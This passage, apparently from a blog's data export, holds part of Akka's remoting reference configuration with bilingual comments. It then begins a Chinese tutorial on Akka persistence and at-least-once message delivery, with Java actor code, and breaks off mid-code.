deserialize received messages also fall under this flag. log-remote-lifecycle-events = on # 以字节为单位记录有效负载大小大于的消息类型 # 这个值。记录一次每个消息类型检测到的最大大小， # 增加10%的门槛。 # 默认情况下，该功能是关闭的。通过将属性设置为激活它 # a以字节为单位的值，例如1000b。注意，对于所有大于此值的消息 # 这将增加额外的性能和可伸缩性成本。 # Logging of message types with payload size in bytes larger than # this value. Maximum detected size per message type is logged once, # with an increase threshold of 10%. # By default this feature is turned off. Activate it by setting the property to # a value in bytes, such as 1000b. Note that for all messages larger than this # limit there will be extra performance and scalability cost. log-frame-size-exceeding = off # 如果在端点的回退缓冲区中的消息的数量 # writer超出此限制。可以通过将该值设置为off来禁用它。 # Log warning if the number of messages in the backoff buffer in the endpoint # writer exceeds this limit. It can be disabled by setting the value to off. log-buffer-size-exceeding = 50000 # 建立出站连接失败后，远程处理将标记 # 地址失败。这个配置选项控制应该使用多少时间 # 在重新尝试一个新连接之前经过#。地址是 # 门控，所有发送到该地址的消息将被发送到死信。 # 因为这个设置限制了重新连接的速率，所以设置为a # 非常短的间隔(即少于一秒)可能导致暴风雨 # 连接尝试。 # After failed to establish an outbound connection, the remoting will mark the # address as failed. This configuration option controls how much time should # be elapsed before reattempting a new connection. While the address is # gated, all messages sent to the address are delivered to dead-letters. # Since this setting limits the rate of reconnects setting it to a # very short interval (i.e. less than a second) may result in a storm of # reconnect attempts. retry-gate-closed-for = 5 s # 在灾难性的通信故障导致系统丢失之后 # 消息或在远程DeathWatch触发后，远程系统得到 # 隔离以防止不一致的行为。 # 此设置控制隔离标记将保留多长时间 # ，以避免长期内存泄漏。 # 警告:不要将此更改为小值以重新启用通信 # 隔离节点。这样的特性是不支持的，任何行为之间 # 解除隔离后受影响的系统未定义 # After catastrophic communication failures that result in the loss of system # messages or after the remote DeathWatch triggers the remote system gets # quarantined to prevent inconsistent behavior. # This setting controls how long the Quarantine marker will be kept around # before being removed to avoid long-term memory leaks. # WARNING: DO NOT change this to a small value to re-enable communication with # quarantined nodes. Such feature is not supported and any behavior between # the affected systems after lifting the quarantine is undefined. prune-quarantine-marker-after = 5 d # 如果系统消息已经在两个系统之间交换(例如远程死亡) # watch or remote deployment has been used)远程系统将被标记为 # 隔离后的两个系统没有活动的关联，没有 # 在这里配置的时间内进行通信。 # 这个设置的唯一目的是避免存储系统消息重传 # data (sequence number state, etc) for an undefined amount of time导致long # 术语内存泄漏。相反，如果一个系统在这个时期消失了， # 或者更确切地说 # -两个系统之间没有关联(TCP连接，如果使用TCP传输) # 双方都没有试图与对方沟通 # 没有挂起的系统消息要传递 # 对于此处配置的时间量，远程系统将被隔离并处于所有状态 # 与它关联的#将被删除。 # If system messages have been exchanged between two systems (i.e. remote death # watch or remote deployment has been used) a remote system will be marked as # quarantined after the two system has no active association, and no # communication happens during the time configured here. # The only purpose of this setting is to avoid storing system message redelivery # data (sequence number state, etc.) for an undefined amount of time leading to long # term memory leak. Instead, if a system has been gone for this period, # or more exactly # - there is no association between the two systems (TCP connection, if TCP transport is used) # - neither side has been attempting to communicate with the other # - there are no pending system messages to deliver # for the amount of time configured here, the remote system will be quarantined and all state # associated with it will be dropped. quarantine-after-silence = 2 d # 该设置定义了未确认系统消息的最大数量 # 允许远程系统。如果达到此限制，则远程系统将 # 声明为死亡，其UID被标记为受污染。 # This setting defines the maximum number of unacknowledged system messages # allowed for a remote system. If this limit is reached the remote system is # declared to be dead and its UID marked as tainted. system-message-buffer-size = 20000 # 这个设置定义了个人之后的最大空闲时间 # 发送系统消息的确认。系统消息传递 # 由显式确认消息保证。这些ack # 利用普通交通信息。如果没有检测到流量 # 在此处配置的时间段内，远程将发送出去 # 个人ack。 # This setting defines the maximum idle time after an individual # acknowledgement for system messages is sent. System message delivery # is guaranteed by explicit acknowledgement messages. These acks are # piggybacked on ordinary traffic messages. If no traffic is detected # during the time period configured here, the remoting will send out # an individual ack. system-message-ack-piggyback-timeout = 0.3 s # 此设置定义了未明确确认或否定确认的参与者(用于临终看护和监督)之间的内部管理信号被怨恨的时间。 # 被否定确认的消息总是立即被厌恶。 # This setting defines the time after internal management signals # between actors (used for DeathWatch and supervision) that have not been # explicitly acknowledged or negatively acknowledged are resent. # Messages that were negatively acknowledged are always immediately # resent. resend-interval = 2 s # 重发未确认的系统消息的最大数量 # 每个“resend-interval”。如果你看到许多(&gt; 1000)远程角色，你可以 # 增加这个值，例如600，但是限制太大(例如10000) # 可能会淹没连接，并可能导致错误的故障检测触发。 # 测试这样的配置，同时观察所有的参与者并停止 # 所有人在同一时间观看演员。 # Maximum number of unacknowledged system messages that will be resent # each &#x27;resend-interval&#x27;. If you watch many (&gt; 1000) remote actors you can # increase this value to for example 600, but a too large limit (e.g. 10000) # may flood the connection and might cause false failure detection to trigger. # Test such a configuration by watching all actors at the same time and stop # all watched actors at the same time. resend-limit = 200 # WARNING:这个设置不应该不被更改，除非它的所有结果 # 是正确理解的假设经验与远程内部或专家建议。 # 此设置定义内部管理重试后的时间 # 停止信号到一个远程系统，该系统之前没有被确认是活的。 # WARNING: this setting should not be not changed unless all of its consequences # are properly understood which assumes experience with remoting internals # or expert advice. # This setting defines the time after redelivery attempts of internal management # signals are stopped to a remote system that has been not confirmed to be alive by # this system before. initial-system-message-delivery-timeout = 3 m ### Transports and adapters # List of the transport drivers that will be loaded by the remoting. # A list of fully qualified config paths must be provided where # the given configuration path contains a transport-class key # pointing to an implementation class of the Transport interface. # If multiple transports are provided, the address of the first # one will be used as a default address. enabled-transports = [&quot;akka.remote.netty.tcp&quot;] # Transport drivers can be augmented with adapters by adding their # name to the applied-adapters setting in the configuration of a # transport. The available adapters should be configured in this # section by providing a name, and the fully qualified name of # their corresponding implementation. The class given here # must implement akka.akka.remote.transport.TransportAdapterProvider # and have public constructor without parameters. adapters &#123; gremlin = &quot;akka.remote.transport.FailureInjectorProvider&quot; trttl = &quot;akka.remote.transport.ThrottlerProvider&quot; &#125; ### Default configuration for the Netty based transport drivers netty.tcp &#123; # The class given here must implement the akka.remote.transport.Transport # interface and offer a public constructor which takes two arguments: # 1) akka.actor.ExtendedActorSystem # 2) com.typesafe.config.Config transport-class = &quot;akka.remote.transport.netty.NettyTransport&quot; # Transport drivers can be augmented with adapters by adding their # name to the applied-adapters list. The last adapter in the # list is the adapter immediately above the driver, while # the first one is the top of the stack below the standard # Akka protocol applied-adapters = [] transport-protocol = tcp # The default remote server port clients should connect to. # Default is 2552 (AKKA), use 0 if you want a random available port # This port needs to be unique for each actor system on the same machine. port = 2552 # The hostname or ip clients should connect to. # InetAddress.getLocalHost.getHostAddress is used if empty hostname = &quot;&quot; # Use this setting to bind a network interface to a different port # than remoting protocol expects messages at. This may be used # when running akka nodes in a separated networks (under NATs or docker containers). # Use 0 if you want a random available port. Examples: # # akka.remote.netty.tcp.port = 2552 # akka.remote.netty.tcp.bind-port = 2553 # Network interface will be bound to the 2553 port, but remoting protocol will # expect messages sent to port 2552. # # akka.remote.netty.tcp.port = 0 # akka.remote.netty.tcp.bind-port = 0 # Network interface will be bound to a random port, and remoting protocol will # expect messages sent to the bound port. # # akka.remote.netty.tcp.port = 2552 # akka.remote.netty.tcp.bind-port = 0 # Network interface will be bound to a random port, but remoting protocol will # expect messages sent to port 2552. # # akka.remote.netty.tcp.port = 0 # akka.remote.netty.tcp.bind-port = 2553 # Network interface will be bound to the 2553 port, and remoting protocol will # expect messages sent to the bound port. # # akka.remote.netty.tcp.port = 2552 # akka.remote.netty.tcp.bind-port = &quot;&quot; # Network interface will be bound to the 2552 port, and remoting protocol will # expect messages sent to the bound port. # # akka.remote.netty.tcp.port if empty bind-port = &quot;&quot; # Use this setting to bind a network interface to a different hostname or ip # than remoting protocol expects messages at. # Use &quot;0.0.0.0&quot; to bind to all interfaces. # akka.remote.netty.tcp.hostname if empty bind-hostname = &quot;&quot; # Enables SSL support on this transport enable-ssl = false # Sets the connectTimeoutMillis of all outbound connections, # i.e. how long a connect may take until it is timed out connection-timeout = 15 s # If set to &quot;&lt;id.of.dispatcher&gt;&quot; then the specified dispatcher # will be used to accept inbound connections, and perform IO. If &quot;&quot; then # dedicated threads will be used. # Please note that the Netty driver only uses this configuration and does # not read the &quot;akka.remote.use-dispatcher&quot; entry. Instead it has to be # configured manually to point to the same dispatcher if needed. use-dispatcher-for-io = &quot;&quot; # Sets the high water mark for the in and outbound sockets, # set to 0b for platform default write-buffer-high-water-mark = 0b # Sets the low water mark for the in and outbound sockets, # set to 0b for platform default write-buffer-low-water-mark = 0b # Sets the send buffer size of the Sockets, # set to 0b for platform default send-buffer-size = 256000b # Sets the receive buffer size of the Sockets, # set to 0b for platform default receive-buffer-size = 256000b # Maximum message size the transport will accept, but at least # 32000 bytes. # Please note that UDP does not support arbitrary large datagrams, # so this setting has to be chosen carefully when using UDP. # Both send-buffer-size and receive-buffer-size settings has to # be adjusted to be able to buffer messages of maximum size. maximum-frame-size = 128000b # Sets the size of the connection backlog backlog = 4096 # Enables the TCP_NODELAY flag, i.e. disables Nagle’s algorithm tcp-nodelay = on # Enables TCP Keepalive, subject to the O/S kernel’s configuration tcp-keepalive = on # Enables SO_REUSEADDR, which determines when an ActorSystem can open # the specified listen port (the meaning differs between *nix and Windows) # Valid values are &quot;on&quot;, &quot;off&quot; and &quot;off-for-windows&quot; # due to the following Windows bug: http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4476378 # &quot;off-for-windows&quot; of course means that it&#x27;s &quot;on&quot; for all other platforms tcp-reuse-addr = off-for-windows # Used to configure the number of I/O worker threads on server sockets server-socket-worker-pool &#123; # Min number of threads to cap factor-based number to pool-size-min = 2 # The pool size factor is used to determine thread pool size # using the following formula: ceil(available processors * factor). # Resulting size is then bounded by the pool-size-min and # pool-size-max values. pool-size-factor = 1.0 # Max number of threads to cap factor-based number to pool-size-max = 2 &#125; # Used to configure the number of I/O worker threads on client sockets client-socket-worker-pool &#123; # Min number of threads to cap factor-based number to pool-size-min = 2 # The pool size factor is used to determine thread pool size # using the following formula: ceil(available processors * factor). # Resulting size is then bounded by the pool-size-min and # pool-size-max values. pool-size-factor = 1.0 # Max number of threads to cap factor-based number to pool-size-max = 2 &#125; &#125; netty.udp = $&#123;akka.remote.netty.tcp&#125; netty.udp &#123; transport-protocol = udp &#125; netty.ssl = $&#123;akka.remote.netty.tcp&#125; netty.ssl = &#123; # Enable SSL/TLS encryption. # This must be enabled on both the client and server to work. enable-ssl = true security &#123; # This is the Java Key Store used by the server connection key-store = &quot;keystore&quot; # This password is used for decrypting the key store key-store-password = &quot;changeme&quot; # This password is used for decrypting the key key-password = &quot;changeme&quot; # This is the Java Key Store used by the client connection trust-store = &quot;truststore&quot; # This password is used for decrypting the trust store trust-store-password = &quot;changeme&quot; # Protocol to use for SSL encryption, choose from: # TLS 1.2 is available since JDK7, and default since JDK8: # https://blogs.oracle.com/java-platform-group/entry/java_8_will_use_tls protocol = &quot;TLSv1.2&quot; # Example: [&quot;TLS_RSA_WITH_AES_128_CBC_SHA&quot;, &quot;TLS_RSA_WITH_AES_256_CBC_SHA&quot;] # You need to install the JCE Unlimited Strength Jurisdiction Policy # Files to use AES 256. # More info here: # http://docs.oracle.com/javase/7/docs/technotes/guides/security/SunProviders.html#SunJCEProvider enabled-algorithms = [&quot;TLS_RSA_WITH_AES_128_CBC_SHA&quot;] # There are three options, in increasing order of security: # &quot;&quot; or SecureRandom =&gt; (default) # &quot;SHA1PRNG&quot; =&gt; Can be slow because of blocking issues on Linux # &quot;AES128CounterSecureRNG&quot; =&gt; fastest startup and based on AES encryption # algorithm # &quot;AES256CounterSecureRNG&quot; # # The following are deprecated in Akka 2.4. They use one of 3 possible # seed sources, depending on availability: /dev/random, random.org and # SecureRandom (provided by Java) # &quot;AES128CounterInetRNG&quot; # &quot;AES256CounterInetRNG&quot; (Install JCE Unlimited Strength Jurisdiction # Policy Files first) # Setting a value here may require you to supply the appropriate cipher # suite (see enabled-algorithms section above) random-number-generator = &quot;&quot; # Require mutual authentication between TLS peers # # Without mutual authentication only the peer that actively establishes a connection (TLS client side) # checks if the passive side (TLS server side) sends over a trusted certificate. With the flag turned on, # the passive side will also request and verify a certificate from the connecting peer. # # To prevent man-in-the-middle attacks you should enable this setting. For compatibility reasons it is # still set to &#x27;off&#x27; per default. # # Note: Nodes that are configured with this setting to &#x27;on&#x27; might not be able to receive messages from nodes that # run on older versions of akka-remote. This is because in older versions of Akka the active side of the remoting # connection will not send over certificates. # # However, starting from the version this setting was added, even with this setting &quot;off&quot;, the active side # (TLS client side) will use the given key-store to send over a certificate if asked. A rolling upgrades from # older versions of Akka can therefore work like this: # - upgrade all nodes to an Akka version supporting this flag, keeping it off # - then switch the flag on and do again a rolling upgrade of all nodes # The first step ensures that all nodes will send over a certificate when asked to. The second # step will ensure that all nodes finally enforce the secure checking of client certificates. require-mutual-authentication = off &#125; &#125; ### Default configuration for the failure injector transport adapter gremlin &#123; # Enable debug logging of the failure injector transport adapter debug = off &#125; ### Default dispatcher for the remoting subsystem default-remote-dispatcher &#123; type = Dispatcher executor = &quot;fork-join-executor&quot; fork-join-executor &#123; parallelism-min = 2 parallelism-factor = 0.5 parallelism-max = 16 &#125; throughput = 10 &#125; backoff-remote-dispatcher &#123; type = Dispatcher executor = &quot;fork-join-executor&quot; fork-join-executor &#123; # Min number of threads to cap factor-based parallelism number to parallelism-min = 2 parallelism-max = 2 &#125; &#125; &#125;&#125;#//#classicakka &#123; remote &#123; #//#artery ### Configuration for Artery, the reimplementation of remoting artery &#123; # Enable the new remoting with this flag enabled = off # Canonical address is the address other clients should connect to. # Artery transport will expect messages to this address. canonical &#123; # The default remote server port clients should connect to. # Default is 25520, use 0 if you want a random available port # This port needs to be unique for each actor system on the same machine. port = 25520 # Hostname clients should connect to. Can be set to an ip, hostname # or one of the following special values: # &quot;&lt;getHostAddress&gt;&quot; InetAddress.getLocalHost.getHostAddress # &quot;&lt;getHostName&gt;&quot; InetAddress.getLocalHost.getHostName # hostname = &quot;&lt;getHostAddress&gt;&quot; &#125; # Use these settings to bind a network interface to a different address # than artery expects messages at. This may be used when running Akka # nodes in a separated networks (under NATs or in containers). If canonical # and bind addresses are different, then network configuration that relays # communications from canonical to bind addresses is expected. bind &#123; # Port to bind a network interface to. Can be set to a port number # of one of the following special values: # 0 random available port # &quot;&quot; akka.remote.artery.canonical.port # port = &quot;&quot; # Hostname to bind a network interface to. Can be set to an ip, hostname # or one of the following special values: # &quot;0.0.0.0&quot; all interfaces # &quot;&quot; akka.remote.artery.canonical.hostname # &quot;&lt;getHostAddress&gt;&quot; InetAddress.getLocalHost.getHostAddress # &quot;&lt;getHostName&gt;&quot; InetAddress.getLocalHost.getHostName # hostname = &quot;&quot; &#125; # Actor paths to use the large message stream for when a message # is sent to them over remoting. The large message stream dedicated # is separate from &quot;normal&quot; and system messages so that sending a # large message does not interfere with them. # Entries should be the full path to the actor. Wildcards in the form of &quot;*&quot; # can be supplied at any place and matches any name at that segment - # &quot;/user/supervisor/actor/*&quot; will match any direct child to actor, # while &quot;/supervisor/*/child&quot; will match any grandchild to &quot;supervisor&quot; that # has the name &quot;child&quot; # Messages sent to ActorSelections will not be passed through the large message # stream, to pass such messages through the large message stream the selections # but must be resolved to ActorRefs first. large-message-destinations = [] # Enable untrusted mode, which discards inbound system messages, PossiblyHarmful and # ActorSelection messages. E.g. remote watch and remote deployment will not work. # ActorSelection messages can be enabled for specific paths with the trusted-selection-paths untrusted-mode = off # When &#x27;untrusted-mode=on&#x27; inbound actor selections are by default discarded. # Actors with paths defined in this white list are granted permission to receive actor # selections messages. # E.g. trusted-selection-paths = [&quot;/user/receptionist&quot;, &quot;/user/namingService&quot;] trusted-selection-paths = [] # If this is &quot;on&quot;, all inbound remote messages will be logged at DEBUG level, # if off then they are not logged log-received-messages = off # If this is &quot;on&quot;, all outbound remote messages will be logged at DEBUG level, # if off then they are not logged log-sent-messages = off advanced &#123; # Maximum serialized message size, including header data. maximum-frame-size = 256 KiB # Direct byte buffers are reused in a pool with this maximum size. # Each buffer has the size of &#x27;maximum-frame-size&#x27;. # This is not a hard upper limit on number of created buffers. Additional # buffers will be created if needed, e.g. when using many outbound # associations at the same time. Such additional buffers will be garbage # collected, which is not as efficient as reusing buffers in the pool. buffer-pool-size = 128 # Maximum serialized message size for the large messages, including header data. # See &#x27;large-message-destinations&#x27;. maximum-large-frame-size = 2 MiB # Direct byte buffers for the large messages are reused in a pool with this maximum size. # Each buffer has the size of &#x27;maximum-large-frame-size&#x27;. # See &#x27;large-message-destinations&#x27;. # This is not a hard upper limit on number of created buffers. Additional # buffers will be created if needed, e.g. when using many outbound # associations at the same time. Such additional buffers will be garbage # collected, which is not as efficient as reusing buffers in the pool. large-buffer-pool-size = 32 # For enabling testing features, such as blackhole in akka-remote-testkit. test-mode = off # Settings for the materializer that is used for the remote streams. materializer = $&#123;akka.stream.materializer&#125; # If set to a nonempty string artery will use the given dispatcher for # the ordinary and large message streams, otherwise the default dispatcher is used. use-dispatcher = &quot;akka.remote.default-remote-dispatcher&quot; # If set to a nonempty string remoting will use the given dispatcher for # the control stream, otherwise the default dispatcher is used. # It can be good to not use the same dispatcher for the control stream as # the dispatcher for the ordinary message stream so that heartbeat messages # are not disturbed. use-control-stream-dispatcher = &quot;&quot; # Controls whether to start the Aeron media driver in the same JVM or use external # process. Set to &#x27;off&#x27; when using external media driver, and then also set the # &#x27;aeron-dir&#x27;. embedded-media-driver = on # Directory used by the Aeron media driver. It&#x27;s mandatory to define the &#x27;aeron-dir&#x27; # if using external media driver, i.e. when &#x27;embedded-media-driver = off&#x27;. # Embedded media driver will use a this directory, or a temporary directory if this # property is not defined (empty). aeron-dir = &quot;&quot; # Whether to delete aeron embeded driver directory upon driver stop. delete-aeron-dir = yes # Level of CPU time used, on a scale between 1 and 10, during backoff/idle. # The tradeoff is that to have low latency more CPU time must be used to be # able to react quickly on incoming messages or send as fast as possible after # backoff backpressure. # Level 1 strongly prefer low CPU consumption over low latency. # Level 10 strongly prefer low latency over low CPU consumption. idle-cpu-level = 5 # WARNING: This feature is not supported yet. Don&#x27;t use other value than 1. # It requires more hardening and performance optimizations. # Number of outbound lanes for each outbound association. A value greater than 1 # means that serialization can be performed in parallel for different destination # actors. The selection of lane is based on consistent hashing of the recipient # ActorRef to preserve message ordering per receiver. outbound-lanes = 1 # WARNING: This feature is not supported yet. Don&#x27;t use other value than 1. # It requires more hardening and performance optimizations. # Total number of inbound lanes, shared among all inbound associations. A value # greater than 1 means that deserialization can be performed in parallel for # different destination actors. The selection of lane is based on consistent # hashing of the recipient ActorRef to preserve message ordering per receiver. inbound-lanes = 1 # Size of the send queue for outgoing messages. Messages will be dropped if # the queue becomes full. This may happen if you send a burst of many messages # without end-to-end flow control. Note that there is one such queue per # outbound association. The trade-off of using a larger queue size is that # it consumes more memory, since the queue is based on preallocated array with # fixed size. outbound-message-queue-size = 3072 # Size of the send queue for outgoing control messages, such as system messages. # If this limit is reached the remote system is declared to be dead and its UID # marked as quarantined. # The trade-off of using a larger queue size is that it consumes more memory, # since the queue is based on preallocated array with fixed size. outbound-control-queue-size = 3072 # Size of the send queue for outgoing large messages. Messages will be dropped if # the queue becomes full. This may happen if you send a burst of many messages # without end-to-end flow control. Note that there is one such queue per # outbound association. The trade-off of using a larger queue size is that # it consumes more memory, since the queue is based on preallocated array with # fixed size. outbound-large-message-queue-size = 256 # This setting defines the maximum number of unacknowledged system messages # allowed for a remote system. If this limit is reached the remote system is # declared to be dead and its UID marked as quarantined. system-message-buffer-size = 20000 # unacknowledged system messages are re-delivered with this interval system-message-resend-interval = 1 second # The timeout for outbound associations to perform the handshake. # This timeout must be greater than the &#x27;image-liveness-timeout&#x27;. handshake-timeout = 20 s # incomplete handshake attempt is retried with this interval handshake-retry-interval = 1 second # handshake requests are performed periodically with this interval, # also after the handshake has been completed to be able to establish # a new session with a restarted destination system inject-handshake-interval = 1 second # messages that are not accepted by Aeron are dropped after retrying for this period give-up-message-after = 60 seconds # System messages that are not acknowledged after re-sending for this period are # dropped and will trigger quarantine. The value should be longer than the length # of a network partition that you need to survive. give-up-system-message-after = 6 hours # during ActorSystem termination the remoting will wait this long for # an acknowledgment by the destination system that flushing of outstanding # remote messages has been completed shutdown-flush-timeout = 1 second # See &#x27;inbound-max-restarts&#x27; inbound-restart-timeout = 5 seconds # Max number of restarts within &#x27;inbound-restart-timeout&#x27; for the inbound streams. # If more restarts occurs the ActorSystem will be terminated. inbound-max-restarts = 5 # See &#x27;outbound-max-restarts&#x27; outbound-restart-timeout = 5 seconds # Max number of restarts within &#x27;outbound-restart-timeout&#x27; for the outbound streams. # If more restarts occurs the ActorSystem will be terminated. outbound-max-restarts = 5 # Stop outbound stream of a quarantined association after this idle timeout, i.e. # when not used any more. stop-quarantined-after-idle = 3 seconds # Timeout after which aeron driver has not had keepalive messages # from a client before it considers the client dead. client-liveness-timeout = 20 seconds # Timeout for each the INACTIVE and LINGER stages an aeron image # will be retained for when it is no longer referenced. # This timeout must be less than the &#x27;handshake-timeout&#x27;. image-liveness-timeout = 10 seconds # Timeout after which the aeron driver is considered dead # if it does not update its C&#x27;n&#x27;C timestamp. driver-timeout = 20 seconds flight-recorder &#123; // FIXME it should be enabled by default when we have a good solution for naming the files enabled = off # Controls where the flight recorder file will be written. There are three options: # 1. Empty: a file will be generated in the temporary directory of the OS # 2. A relative or absolute path ending with &quot;.afr&quot;: this file will be used # 3. A relative or absolute path: this directory will be used, the file will get a random file name destination = &quot;&quot; &#125; # compression of common strings in remoting messages, like actor destinations, serializers etc compression &#123; actor-refs &#123; # Max number of compressed actor-refs # Note that compression tables are &quot;rolling&quot; (i.e. a new table replaces the old # compression table once in a while), and this setting is only about the total number # of compressions within a single such table. # Must be a positive natural number. max = 256 # interval between new table compression advertisements. # this means the time during which we collect heavy-hitter data and then turn it into a compression table. advertisement-interval = 1 minute &#125; manifests &#123; # Max number of compressed manifests # Note that compression tables are &quot;rolling&quot; (i.e. a new table replaces the old # compression table once in a while), and this setting is only about the total number # of compressions within a single such table. # Must be a positive natural number. max = 256 # interval between new table compression advertisements. # this means the time during which we collect heavy-hitter data and then turn it into a compression table. advertisement-interval = 1 minute &#125; &#125; # List of fully qualified class names of remote instruments which should # be initialized and used for monitoring of remote messages. # The class must extend akka.remote.artery.RemoteInstrument and # have a public constructor with empty parameters or one ExtendedActorSystem # parameter. # A new instance of RemoteInstrument will be created for each encoder and decoder. # It&#x27;s only called from the stage, so if it dosn&#x27;t delegate to any shared instance # it doesn&#x27;t have to be thread-safe. # Refer to `akka.remote.artery.RemoteInstrument` for more information. instruments = $&#123;?akka.remote.artery.advanced.instruments&#125; [] &#125; &#125; &#125;&#125;#//#artery","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-持久化-消息发送与接收","slug":"network/akka/Akka-持久化-消息发送与接收","date":"2021-12-03T08:23:51.202Z","updated":"2021-12-03T08:41:18.473Z","comments":true,"path":"2021/12/03/network/akka/Akka-持久化-消息发送与接收/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-%E6%8C%81%E4%B9%85%E5%8C%96-%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/","excerpt":"","text":"1.概述 在《使用Akka持久化——持久化与快照》一文中介绍了如何使用Akka持久化消息及生成快照。对于集群应用来说，发送者发出消息，只有当收到了接受者的成功回复才应当认为是一次完整的请求和应答（一些RPC框架只提供了远程调用、序列化/反序列化的机制，但是具体调用的成功与否实际是抛给了开发者本人），利用Akka的应答机制很容易实现这些功能。特殊情况下发送者发送了消息，但是最终接受者却没有接收到消息，导致这一情况发生的因素很多（例如：发送者调用完发送接口后，发送者所在进程奔溃了；网络故障；接收者不存在等）。如果这些消息的成功接收与处理对于整个应用而言具有强一致性的要求，那么这些都会导致很多困扰，好在我们可以使用Akka的持久化机制。 ​ 发送者在发送消息之前先对消息进行持久化，那么无论任何原因导致没有收到接收者的成功回复时，我们总能有办法从持久化信息中找出那些未被成功回复的消息进行重发（这说明接收者接到的消息有可能会重复，此时需要保证接收者的实现是冥等的）。当接收者收到消息进行处理后需要向发送者发送成功回复，发送者收到回复后的第一个动作应当是对回复内容的持久化，否则有可能在还未真正对成功回复处理时宕机或进程奔溃导致回复消息丢失（在持久化与收到消息之间仍然会存在宕机和进程奔溃的情况，只不过这个时间非常短，因此丢失回复的可能会很低），当持久化回复消息完成后，可以自己慢慢来处理这些确认信息，而不用担心它们丢失了。​ 本文将根据Akka官网的例子，对其做一些适应性改造后，向大家展示Akka持久化的另一个强大武器——At least once delivery！ 2.消息投递规则 一般而言，消息投递有下面三种情况： at-most-once 意味着每条应用了这种机制的消息会被投递0次或1次。可以说这条消息可能会丢失。 at-least-once 意味着每条应用了这种机制的消息潜在的存在多次投递尝试并保证至少会成功一次。就是说这条消息可能会重复但是不会丢失。 exactly-once 意味着每条应用了这种机制的消息只会向接收者准确的发送一次。换言之，这种消息既不会丢失也不会重复。 at-most-once的成本最低且性能最高，因为它在发送完消息后不会尝试去记录任何状态，然后这条消息将被他抛之脑后。at-least-once需要发送者必须认识它所发送过的消息，并对没有收到回复的消息进行发送重试。exactly-once的成本是三者中最高的而且性能却又是三者中最差的，它除了要求发送者有记忆和重试能力，还要求接收者能够认识接收过的消息并能过滤出那些重复的消息投递。Akka的Actor模型一般提供的消息都属于at-most-once，那是因为大多数场景都不需要有状态的消息投递，例如web服务器请求。当你有强一致性需求时，才应该启用Akka的at-least-once机制，那就是你的Actor不再继承自UntypedActor，而是继承自UntypedPersistentActorWithAtLeastOnceDelivery。 3.配置如果要使用，那么需要在中增加以下的一些配置： 1234at-least-once-delivery &#123; redeliver-interval = 20000 redelivery-burst-limit = 100&#125; redeliver-interval用于配置重新进行投递尝试的时间间隔，单位是毫秒。redelivery-burst-limit用于配置每次重新执行投递尝试时发送的最大消息条数。​ 4.一致性消息例子 我们首先来看看本例中用到的消息体MsgSent、Msg、Confirm及MsgConfirmed。MsgSent代表将要发送的消息，但是只用于持久化，持久化完成后会将MsgSent转换为Msg进行发送。也就是说Msg才会被真正用于消息发送。接收者收到Msg消息后将向发送者回复Confirm消息，需要注意的是Msg和Confirm都有属性deliveryId，此deliveryId由发送者的持久化功能生成，一条Msg消息和其对应的Confirm回复的deliveryId必须一致，否则在利用UntypedPersistentActorWithAtLeastOnceDelivery对回复消息进行确认时会产生严重的bug。发送者收到接收者的Confirm回复后首先将其转换为MsgConfirmed，然后对MsgConfirmed进行持久化，最后调用UntypedPersistentActorWithAtLeastOnceDelivery提供的confirmDelivery方法对回复进行确认。MsgSent、Msg、Confirm及MsgConfirmed的代码实现如下： 1234567891011121314151617181920212223242526272829303132333435363738394041public interface Persistence &#123; public static class Msg implements Serializable &#123; private static final long serialVersionUID = 1L; public final long deliveryId; public final String s; public Msg(long deliveryId, String s) &#123; this.deliveryId = deliveryId; this.s = s; &#125; &#125; public static class Confirm implements Serializable &#123; private static final long serialVersionUID = 1L; public final long deliveryId; public Confirm(long deliveryId) &#123; this.deliveryId = deliveryId; &#125; &#125; public static class MsgSent implements Serializable &#123; private static final long serialVersionUID = 1L; public final String s; public MsgSent(String s) &#123; this.s = s; &#125; &#125; public static class MsgConfirmed implements Serializable &#123; private static final long serialVersionUID = 1L; public final long deliveryId; public MsgConfirmed(long deliveryId) &#123; this.deliveryId = deliveryId; &#125; &#125; &#125; 4.1.服务端本例中的服务端非常简单，是一个接收处理Msg消息，并向发送者回复Confirm消息的Actor，代码如下: 12345678910111213141516@Named(&quot;MyDestination&quot;)@Scope(&quot;prototype&quot;)public class MyDestination extends UntypedActor &#123; LoggingAdapter log = Logging.getLogger(getContext().system(), this); public void onReceive(Object message) throws Exception &#123; if (message instanceof Msg) &#123; Msg msg = (Msg) message; log.info(&quot;receive msg : &quot; + msg.s + &quot;, deliveryId : &quot; + msg.deliveryId); getSender().tell(new Confirm(msg.deliveryId), getSelf()); &#125; else &#123; unhandled(message); &#125; &#125;&#125; 服务端的启动代码如下： 123logger.info(&quot;Start myDestination&quot;);final ActorRef myDestination = actorSystem.actorOf(springExt.props(&quot;MyDestination&quot;), &quot;myDestination&quot;);logger.info(&quot;Started myDestination&quot;); 4.2.客户端具体介绍客户端之前，先来列出其实现，代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667@Named(&quot;MyPersistentActor&quot;)@Scope(&quot;prototype&quot;)public class MyPersistentActor extends UntypedPersistentActorWithAtLeastOnceDelivery &#123; LoggingAdapter log = Logging.getLogger(getContext().system(), this); private final ActorSelection destination; @Override public String persistenceId() &#123; return &quot;persistence-id&quot;; &#125; public MyPersistentActor(ActorSelection destination) &#123; this.destination = destination; &#125; @Override public void onReceiveCommand(Object message) &#123; if (message instanceof String) &#123; String s = (String) message; log.info(&quot;receive msg : &quot; + s); persist(new MsgSent(s), new Procedure&lt;MsgSent&gt;() &#123; public void apply(MsgSent evt) &#123; updateState(evt); &#125; &#125;); &#125; else if (message instanceof Confirm) &#123; Confirm confirm = (Confirm) message; log.info(&quot;receive confirm with deliveryId : &quot; + confirm.deliveryId); persist(new MsgConfirmed(confirm.deliveryId), new Procedure&lt;MsgConfirmed&gt;() &#123; public void apply(MsgConfirmed evt) &#123; updateState(evt); &#125; &#125;); &#125; else if (message instanceof UnconfirmedWarning) &#123; log.info(&quot;receive unconfirmed warning : &quot; + message); // After a number of delivery attempts a AtLeastOnceDelivery.UnconfirmedWarning message will be sent to self. The re-sending will still continue, but you can choose to call confirmDelivery to cancel the re-sending. 